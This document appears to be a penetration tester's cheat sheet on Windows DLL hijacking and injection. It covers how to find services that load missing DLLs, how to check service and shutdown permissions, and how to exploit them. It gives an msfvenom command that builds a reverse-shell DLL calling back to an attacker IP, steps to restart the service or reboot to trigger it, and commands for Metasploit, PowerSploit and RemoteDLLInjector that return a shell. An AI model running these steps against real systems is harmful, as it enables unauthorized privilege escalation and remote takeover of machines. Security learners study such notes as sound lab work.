DLL (Dynamic link library) are files that contain codes and proceduers that can be used by other program. DLL hijacking involves injecting malicious code into an application by loading an evil DLL. 

This is made possible becuase of the way windows applications search and load DLLs. If the path to a service's DLL isnt already loaded or stored in the system, Windows will start looking for it in the environment path. The attacker can place the malicious DLL in the path and trigger the malicious code. 

# Identifying Vulnerable Services
-  Procmon (Process monitor) can be used to find services that are vulneralble to DLL injections.
	-  Use the filter option to view relevant information. 
		- Process Name is \<process name>
		- Result is \<name not found>
		- Path is \<locaion of exe>
- If GUI not available, the following cmdlets can be used to idetify vulnerable services.
	- `tasklist /v /FO csv > tasks.txt` (create a txt file with a list of current process)
	- `findstr <process name> tasks.txt` (search for a specific process)
	- `echo %PATH%` (view the environmental path)
	- `icacls <directory>` (check if the current user has write permission to the path directory)
- [winpeas](https://github.com/carlospolop/PEASS-ng) can also bee used to identify vulnerable services among other things.

# Identifying user permissions
For DLL hijacking to work, it is necessary that the user has permission to either restart the service or restart the system. The following commands can be used to identify if the permissions are set. 
- `sc.exe sdshow <service>` to check user permission on the service
	- read more about the output and its meaning [here](http://woshub.com/set-permissions-on-windows-service/)
- `whoami /priv` 
	- `SeShutdownPrivilege` means user has shutdown privilege.
# Exploitation
## Payload generation
- msfvenom  can be used to generate a malicious payload. 
	- `msfvenom -p windows/x64/shell_reverse_tcp LHOST = <attacker ip> LPORT = <port> -f dll -o <TargetName.dll>`
	- The victim machine's architecture must be noted when generating payloads.
	- Transfer the payload to destination.
	- Setup a listener
		- Either netcat or meterpreter listener.
## Manual method
- Restart the service. 
	- `sc stop <service>` and `sc start <service>`.
- Alternatly, restart system if user does not have serivice permissions.
	- `sc qc <service>` to check if service starts at boot.
	- `shutdown /r /t 0` to reboot system.
- A shell will be returned in our listener.

## Automated method
### Remote DLL injector 
- [Remote DLL injector](https://securityxploded.com/remote-dll-injector.php#RemoteDLLInjector_Download) is a tool that can inject malicious dlls even in ASLR enabled processes. This tool requres the **PID** and **path** of the DLL to function. Available in both 32bit and 64bit versions.
	- `RemoteDLLInjector64.exe <PID> <path to dll>`
	- It will return a shell in our listener.

### Metasploit
The metasploit framework contains `post/windows/manage/reflective_dll_inject` module to automate the process. 
- This requires a meterpreter session. 
- This requires **PID** and **DLL Path*
- Returns a shell in our listener.

### PowerSploit
Powersploit contains `Invoke-DLLInjection` that can perform dll injection. 
- `Invoke-DLLInjetion -ProcessID <pid> -DLL <path to dll>`
- Will return a shell in our listener.
# Additional resources
1. [This](https://steflan-security.com/windows-privilege-escalation-dll-hijacking/) blog post by Stefano Larano.
2. [This](https://www.youtube.com/watch?v=xKOwE6KTWic) youtube video by Penter Academy.
3. [This](https://pentestlab.blog/2017/04/04/dll-injection/) article on pentestlab.
